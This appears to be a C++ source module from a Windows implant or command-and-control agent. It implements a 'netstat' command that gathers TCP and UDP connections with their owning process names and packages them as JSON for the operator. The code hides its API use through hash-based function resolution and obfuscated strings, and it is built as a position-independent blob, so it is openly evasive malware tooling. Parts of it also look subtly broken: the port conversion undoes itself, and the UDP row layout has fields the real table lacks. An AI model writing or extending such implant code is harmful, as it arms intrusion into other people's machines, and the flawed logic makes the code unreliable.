#include "config.h"
#ifdef INCLUDE_CMD_NETSTAT

#include "commands.h"
#include "json_out.h"
#include <tlhelp32.h>

typedef DWORD (WINAPI *fn_GetExtendedTcpTable_t)(void*, DWORD*, BOOL, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *fn_GetExtendedUdpTable_t)(void*, DWORD*, BOOL, DWORD, DWORD, DWORD);

#pragma pack(push, 1)
struct MIB_TCPROW_OWNER_A {
    DWORD state; DWORD localAddr; DWORD localPort; DWORD remoteAddr; DWORD remotePort; DWORD pid;
};
struct MIB_TCPTABLE_OWNER_A {
    DWORD numEntries;
    MIB_TCPROW_OWNER_A table[1];
};
struct MIB_UDPROW_OWNER_A {
    DWORD localAddr; DWORD localPort; DWORD remoteAddr; DWORD remotePort; DWORD pid;
};
struct MIB_UDPTABLE_OWNER_A {
    DWORD numEntries;
    MIB_UDPROW_OWNER_A table[1];
};
#pragma pack(pop)

static void ip_str(DWORD ip, char* out) {
    unsigned char* b = (unsigned char*)&ip;
    int p = 0;
    for (int i = 0; i < 4; i++) {
        DWORD v = b[i];
        char tmp[4]; int ti = 0;
        if (v == 0) tmp[ti++] = '0';
        else while (v > 0) { tmp[ti++] = '0' + (char)(v % 10); v /= 10; }
        for (int j = ti - 1; j >= 0; j--) out[p++] = tmp[j];
        if (i < 3) out[p++] = '.';
    }
    out[p] = 0;
}

static const char* tcp_state(DWORD s) {
    switch (s) {
        case 1: return "CLOSED"; case 2: return "LISTEN"; case 3: return "SYN_SENT";
        case 4: return "SYN_RCVD"; case 5: return "ESTABLISHED"; case 6: return "FIN_WAIT1";
        case 7: return "FIN_WAIT2"; case 8: return "CLOSE_WAIT"; case 9: return "CLOSING";
        case 10: return "LAST_ACK"; case 11: return "TIME_WAIT"; case 12: return "DELETE_TCB";
        default: return "UNKNOWN";
    }
}

static void port_str(DWORD port_be, char* out) {
    DWORD v = ((port_be & 0xFF) << 8) | ((port_be >> 8) & 0xFF);
    v = ((v & 0xFF) << 8) | ((v >> 8) & 0xFF); // network to host
    char tmp[8]; int ti = 0;
    if (v == 0) tmp[ti++] = '0';
    else while (v > 0) { tmp[ti++] = '0' + (char)(v % 10); v /= 10; }
    for (int j = ti - 1; j >= 0; j--) out[j] = tmp[j];
    out[ti] = 0;
    // reverse write
    char tmp2[8];
    for (int j = 0; j < ti; j++) tmp2[j] = tmp[ti - 1 - j];
    for (int j = 0; j < ti; j++) out[j] = tmp2[j];
    out[ti] = 0;
}

VOID cmd_netstat(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_iph, "iphlpapi.dll");
    HMODULE h_iph = inst->Win32.LoadLibraryA(_iph);
    fn_GetExtendedTcpTable_t pTcp = h_iph ?
        (fn_GetExtendedTcpTable_t)resolve_function(h_iph, hash_string_djb2(XSTR("GetExtendedTcpTable"))) : NULL;
    fn_GetExtendedUdpTable_t pUdp = h_iph ?
        (fn_GetExtendedUdpTable_t)resolve_function(h_iph, hash_string_djb2(XSTR("GetExtendedUdpTable"))) : NULL;
    if (!pTcp || !pUdp) {
        package_add_string(inst, response, XSTR("iphlpapi resolve failed"));
        response->is_error = TRUE;
        return;
    }

    // build pid->name map once
    // heap-resident (allocated once): a static array is emitted into .data
    // and objcopy embeds it zero-filled in the flat PIC blob. Also 133KB
    // would blow the agent thread's stack if placed there (the JSON_BUF adds
    // another 16KB); the agent is single-threaded.
    static struct { DWORD pid; char name[256]; }* proc_names = NULL;
    if (!proc_names) proc_names = (decltype(proc_names))es_malloc(inst, 512 * 260);
    if (!proc_names) { package_add_string(inst, response, XSTR("alloc failed")); response->is_error = TRUE; return; }
    HANDLE hSnap = inst->Win32.CreateToolhelp32Snapshot(0x00000002, 0);
    DWORD pn_count = 0;
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        es_memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (inst->Win32.Process32First(hSnap, &pe)) {
            do {
                if (pn_count < 512) {
                    proc_names[pn_count].pid = pe.th32ProcessID;
                    int k = 0;
                    for (; pe.szExeFile[k] && k < 255; k++) proc_names[pn_count].name[k] = pe.szExeFile[k];
                    proc_names[pn_count].name[k] = 0;
                    pn_count++;
                }
            } while (inst->Win32.Process32Next(hSnap, &pe));
        }
        gate_CloseHandle(inst, hSnap);
    }

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"connections\":[");

    // TCP
    DWORD tcp_size = 0;
    DWORD tcp_count_printed = 0;
    if (pTcp(NULL, &tcp_size, TRUE, 2 /*AF_INET*/, 5 /*TABLE_OWNER_PID_ALL*/, 0) == 122 && tcp_size > 0) {
        static BYTE* tcp_buf = NULL;
        // heap-resident: static arrays embed zero-filled in the PIC blob
        if (!tcp_buf) tcp_buf = (BYTE*)es_malloc(inst, 262144);
        if (tcp_buf && tcp_size <= 262144 && pTcp(tcp_buf, &tcp_size, TRUE, 2, 5, 0) == 0) {
            DWORD n = *(DWORD*)tcp_buf;
            MIB_TCPROW_OWNER_A* rows = (MIB_TCPROW_OWNER_A*)(tcp_buf + 4);
            for (DWORD i = 0; i < n; i++) {
                if (tcp_count_printed) j_append_raw(&jb, ",");
                j_append_raw(&jb, "{\"proto\":\"tcp\",\"local\":");
                char lip[16], lport[8];
                ip_str(rows[i].localAddr, lip);
                port_str(rows[i].localPort, lport);
                j_append_str(&jb, lip);
                j_append_raw(&jb, ",\"lport\":");
                j_append_str(&jb, lport);
                j_append_raw(&jb, ",\"remote\":");
                char rip[16], rport[8];
                ip_str(rows[i].remoteAddr, rip);
                port_str(rows[i].remotePort, rport);
                j_append_str(&jb, rip);
                j_append_raw(&jb, ",\"rport\":");
                j_append_str(&jb, rport);
                j_append_raw(&jb, ",\"state\":");
                j_append_str(&jb, tcp_state(rows[i].state));
                j_append_raw(&jb, ",\"pid\":");
                j_append_uint(&jb, rows[i].pid);
                j_append_raw(&jb, ",\"process\":");
                char pname[256] = "-";
                for (DWORD m = 0; m < pn_count; m++)
                    if (proc_names[m].pid == rows[i].pid) { int k=0; for(;proc_names[m].name[k];k++) pname[k]=proc_names[m].name[k]; pname[k]=0; break; }
                j_append_str(&jb, pname);
                j_append_raw(&jb, "}");
                tcp_count_printed++;
            }
        }
    }

    // UDP
    DWORD udp_size = 0;
    if (pUdp(NULL, &udp_size, TRUE, 2, 1 /*TABLE_OWNER_PID*/, 0) == 122 && udp_size > 0) {
        static BYTE* udp_buf = NULL;
        // heap-resident: static arrays embed zero-filled in the PIC blob
        if (!udp_buf) udp_buf = (BYTE*)es_malloc(inst, 262144);
        if (udp_buf && udp_size <= 262144 && pUdp(udp_buf, &udp_size, TRUE, 2, 1, 0) == 0) {
            DWORD n = *(DWORD*)udp_buf;
            MIB_UDPROW_OWNER_A* rows = (MIB_UDPROW_OWNER_A*)(udp_buf + 4);
            for (DWORD i = 0; i < n; i++) {
                if (tcp_count_printed) j_append_raw(&jb, ",");
                j_append_raw(&jb, "{\"proto\":\"udp\",\"local\":");
                char lip[16], lport[8];
                ip_str(rows[i].localAddr, lip);
                port_str(rows[i].localPort, lport);
                j_append_str(&jb, lip);
                j_append_raw(&jb, ",\"lport\":");
                j_append_str(&jb, lport);
                j_append_raw(&jb, ",\"remote\":\"-\",\"rport\":\"0\",\"state\":\"-\",\"pid\":");
                j_append_uint(&jb, rows[i].pid);
                j_append_raw(&jb, ",\"process\":");
                char pname[256] = "-";
                for (DWORD m = 0; m < pn_count; m++)
                    if (proc_names[m].pid == rows[i].pid) { int k=0; for(;proc_names[m].name[k];k++) pname[k]=proc_names[m].name[k]; pname[k]=0; break; }
                j_append_str(&jb, pname);
                j_append_raw(&jb, "}");
                tcp_count_printed++;
            }
        }
    }

    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, tcp_count_printed);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
